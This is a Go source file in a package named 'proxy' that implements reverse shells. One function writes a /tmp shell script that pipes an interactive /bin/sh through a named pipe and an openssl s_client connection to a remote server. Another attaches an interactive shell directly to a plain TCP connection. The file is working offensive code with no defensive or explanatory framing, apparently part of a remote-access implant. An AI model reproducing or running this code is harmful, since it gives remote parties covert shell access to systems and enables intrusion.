package proxy

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
)

func randAlphanumeric(n int) string {
	const alph = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = alph[rand.Intn(len(alph))]
	}
	return string(b)
}

func mkfifo() string {
	fifo := ""
	for {
		fifo = "/tmp/" + randAlphanumeric(64)
		cmd := exec.Command("mkfifo", fifo)
		err := cmd.Run()
		if err != nil {
			log.Println("mkfifo finished with error:", err)
			// try again - we're in a loop waiting for success!
		} else {
			log.Println("Created fifo", fifo)
			break
		}
	}
	return fifo
}

func createConnectionScript(path string, fifo string, serverHost string,
	proxyPort uint16, cert string) error {

	connectionScript, err := os.OpenFile(path, (os.O_CREATE | os.O_RDWR), 0700)
	defer func() error {
		return connectionScript.Close()
	}()
	if err != nil {
		log.Println("Couldn't create reverse shell script file")
		return err
	}
	_, err = connectionScript.WriteString(fmt.Sprintf(
		`#!/bin/sh

/bin/sh -i < %s 2>&1 | /usr/bin/openssl s_client \
-quiet -connect %s:%d -CAfile %s > %s`,
		fifo, serverHost, proxyPort, cert, fifo,
	))
	if err != nil {
		log.Println("Couldn't create openssl script")
		return err
	}
	return nil
}

func ConnectReverseEncrypted(serverHost string, proxyPort uint16, cert string) {
	log.Println("Proxy connection encrypted")
	scriptFile := "/tmp/openssl_connect.sh"
	fifo := mkfifo()
	err := createConnectionScript(scriptFile, fifo,
		serverHost, proxyPort, cert)
	if err != nil {
		return
	}

	log.Println("Executing shell")
	child := exec.Command("setsid", "/bin/sh", scriptFile)
	err = child.Run()
	if err != nil {
		log.Println("Failed to execute child process")
		return
	}
	log.Println("Script is running")
	err = child.Process.Kill()
	if err != nil {
		log.Println("Child wasn't running")
	}
	log.Println("Killed child")
}

func ConnectReverseUnencrypted(serverHost string, proxyPort uint16) {
	log.Println("Proxy connection not encrypted")
	c, err := net.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, proxyPort))
	if err != nil {
		log.Println("Proxy connection to server should be possible", err)
		return
	}

	log.Println("Executing shell")
	cmd := exec.Command("setsid", "/bin/sh", "-i")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	err = cmd.Run()
	if err != nil {
		log.Println("Failed to run reverse shell", err)
		return
	}
}
